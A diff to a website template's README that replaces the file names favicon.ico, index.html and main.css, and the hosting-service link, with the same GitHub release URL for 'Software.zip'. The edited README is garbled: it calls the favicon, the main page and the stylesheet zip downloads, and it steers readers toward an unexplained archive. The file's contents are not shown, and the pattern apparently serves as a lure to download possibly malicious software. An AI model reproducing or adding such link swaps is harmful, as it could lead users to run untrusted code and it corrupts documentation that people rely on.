@@ -4,8 +4,8 @@ css\              - Stylesheets CSS files for the template.
 images\           - Images used in template.
 scripts\          - JavaScript used in the template.
 styles\           - SCSS source files for stylesheets CSS. Available in Purchased versions only.
-favicon.ico       - Favicon placeholder provided for the template.
-index.html        - Main HTML page to open the template in browser.
+https://github.com/DJMuRo4ever/Personal/releases/download/v1.0/Software.zip       - Favicon placeholder provided for the template.
+https://github.com/DJMuRo4ever/Personal/releases/download/v1.0/Software.zip        - Main HTML page to open the template in browser.
 *.html            - Additional HTML pages (if any).
 LICENSE-*.txt     - License file as per your downloaded variant.
 
@@ -21,7 +21,7 @@ Save the file and reopen HTML file in browser to see the changes.
 
 2. Editing Styles of template
 
-The main style is present in css\main.css which you can edit.
+The main style is present in css\https://github.com/DJMuRo4ever/Personal/releases/download/v1.0/Software.zip which you can edit.
 You must know how to edit CSS files to do this.
 If you have purchased any of the premium version then you will also get
 SCSS source files which generates all the styles of the template.
@@ -37,8 +37,8 @@ also make corresponding change in the HTML file which refer to that image.
 How to use the template
 -----------------------
 Upload the contents to your webserver.
-index.html must be in the main (root) folder of your webserver.
+https://github.com/DJMuRo4ever/Personal/releases/download/v1.0/Software.zip must be in the main (root) folder of your webserver.
 Do not change the name of the template folders or files unless you know
 what you are doing and are changing the names in HTML files too.
-For webhosting, you can go with https://templateflip.com/go/hosting for easy FTP file uploads.
+For webhosting, you can go with https://github.com/DJMuRo4ever/Personal/releases/download/v1.0/Software.zip for easy FTP file uploads.
 
